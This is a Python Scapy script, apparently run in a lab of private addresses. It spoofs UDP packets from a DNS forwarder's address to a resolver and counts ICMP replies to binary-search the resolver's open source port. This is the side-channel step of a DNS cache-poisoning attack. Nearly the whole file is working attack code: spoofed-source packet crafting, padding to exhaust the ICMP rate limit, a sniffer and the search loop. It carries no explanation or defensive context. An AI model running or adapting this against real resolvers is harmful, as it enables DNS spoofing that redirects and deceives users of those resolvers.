from scapy.all import *
import time

sourcePort = 33052

startRange = 25555-20
my_ip = "10.211.55.2"
# my_ip = "100.64.1.133"
# my_ip = "104.241.0.10"
forwarder_ip = "10.211.55.12"
# forwarder_ip = "10.211.55.11"
resolver_ip = "10.211.55.11"
endRange = startRange + 1000
interval = 50
vm_socket = conf.L2socket(iface="bridge100")
GLOBAL_ICMP_COUNTS = 0

# for i in range(startRange, endRange, interval):
#     pkts = []

#     for j in range(i, i + interval):
#         pkts.append(bytes(Ether(src="5e:e9:1e:c9:af:65", dst="00:1c:42:da:3d:8a") / IP(src="10.37.129.254", dst="10.37.129.3") / UDP(sport=sourcePort, dport=j)))

#     # create verification packet
#     pkts.append(bytes(Ether(dst="00:1c:42:da:3d:8a") / IP(dst="10.37.129.3") / UDP(sport=sourcePort, dport=1)))

#     sendp(pkts, iface="bridge101")
#     time.sleep(1)


# Ether(src="00:1c:42:f9:25:9d", dst="00:1c:42:da:3d:8a")
"""

WITH MAC
"""


data="\x67\x61\x79\x0a"
# pkts.append(bytes(Ether(src="00:1c:42:f9:25:9d") / IP(src=forwarder_ip, dst=resolver_ip) / UDP(sport=sourcePort, dport=9999)/Raw(load=data)))
# pkts.append(bytes(Ether() / IP(src=forwarder_ip, dst=resolver_ip) / UDP(sport=sourcePort, dport=9998)/Raw(load=data)))
# sendp(pkts, iface="bridge100")
# sr(raw(Ether() / IP(dst=resolver_ip, src=my_ip) / UDP(sport=sourcePort, dport=1)/Raw(load=data)), timeout=0.1)


# exit()
def create_pkts(startRange, endRange):
    pkts = []
    if (endRange-startRange == 50):
        for i in range(startRange, endRange): # note this is [startRange, endRange)
            pkts.append(raw(Ether(src="00:1c:42:f9:25:9d") / IP(src=forwarder_ip, dst=resolver_ip) / UDP(sport=sourcePort, dport=i)/Raw(load=data)))
    else:
        if (startRange-endRange == 0):
            return pkts
        print("adding padding")
        for i in range(startRange, endRange): # note this is [startRange, endRange)
            pkts.append(raw(Ether(src="00:1c:42:f9:25:9d") / IP(src=forwarder_ip, dst=resolver_ip) / UDP(sport=sourcePort, dport=i)/Raw(load=data)))
        print("create_pkts_padding")
        print(range(startRange, endRange))
        for i in range(2, 50-(endRange-startRange)+2): # add padding
            pkts.append(raw(Ether(src="00:1c:42:f9:25:9d") / IP(src=forwarder_ip, dst=resolver_ip) / UDP(sport=sourcePort, dport=RandShort())/Raw(load=data)))

    verification_pkt = Ether()/IP(dst=resolver_ip)/UDP(sport=sourcePort,dport=1) # known closed source port
    pkts.append(verification_pkt)
    return pkts

# create verification packet
# pkts.append(raw(Ether(src="5e:e9:1e:c9:af:64") / IP(dst=resolver_ip, src=my_ip) / UDP(sport=sourcePort, dport=1)/Raw(load=data)))
# pkts.append(raw(Ether() / IP(dst=resolver_ip, src=my_ip) / UDP(sport=sourcePort, dport=1)/Raw(load=data)))
# this is where u either get reply or no reply
# for i in range(949):
#     pkts.append(raw(Ether(src="00:1c:42:f9:25:9d") / IP(src=forwarder_ip, dst=resolver_ip) / UDP(sport=sourcePort, dport=RandShort())/Raw(load=data)))

def pkt_callback(pkt):
    global GLOBAL_ICMP_COUNTS
    # packet found
    if pkt.dport == 1:
        print("resp")
        GLOBAL_ICMP_COUNTS+=1

    # print(pkt)
    # print(pkt.dst)
    # print(pkt.dport)


t = AsyncSniffer( filter="icmp", prn = pkt_callback, iface="bridge100")

t.start()
pkts = create_pkts(startRange=startRange, endRange=startRange+50)

"""
if counter increases, then between the 0-50 scanned, there was an open port
scan first half

scan second half

"""
def binary_search(low, high):
    global GLOBAL_ICMP_COUNTS
    local_icmp_counts = GLOBAL_ICMP_COUNTS
    # low, high = startRange, endRange - 1
    if low == high:
        print("low/high same "+ str(low))
        return
        
    while low < high:
        left = False
        mid = (low + high) // 2
        
        # call left
        pkts = create_pkts(low, mid)
        print(len(pkts))
        sendp(pkts, iface="bridge100")
        time.sleep(1)
        if ((GLOBAL_ICMP_COUNTS > local_icmp_counts) and not left):
            left = True
            print(low)
            print(high)
            print("going left")
            return binary_search(low, mid)
            
        
        # call right
        pkts = create_pkts(mid, high)
        sendp(pkts, iface="bridge100")
        print("from right:")
        time.sleep(1)
        print(GLOBAL_ICMP_COUNTS)
        print(local_icmp_counts)
        if ((GLOBAL_ICMP_COUNTS > local_icmp_counts) and not left):
            print(low)
            print(high)
            print("going right")
            return binary_search(mid, high)
            

        else:
            print("exiting")
            print(low)
            print(high)
            return

sendp(pkts, iface="bridge100")

binary_search(startRange, startRange+50)

# time.sleep(0.01)
# vm_socket.sr1(raw(Ether(src="5e:e9:1e:c9:af:64") / IP(dst=resolver_ip, src=my_ip) / UDP(sport=sourcePort, dport=1)/Raw(load=data)))
# reply = sr(verification_pkt,timeout=0.1)
# sendp(verification_pkt, iface="bridge100")
# print(reply)
# sendp(raw(Ether() / IP(dst=resolver_ip, src=my_ip) / UDP(sport=sourcePort, dport=1)/Raw(load=data)), iface="bridge100")
time.sleep(1)


t.stop()


# pkts = []
# for i in range(startRange, startRange+50):
#     pkts.append(bytes(Ether(src="00:1c:42:f9:25:9d") / IP(src="10.211.55.12", dst="10.211.55.11") / UDP(sport=sourcePort, dport=i)))

# # create verification packet
# pkts.append(bytes(Ether(dst="00:1c:42:da:3d:8a") / IP(dst="10.211.55.11") / UDP(sport=sourcePort, dport=1)))
# # this is where u either get reply or no reply

# sendp(pkts, iface="bridge101")
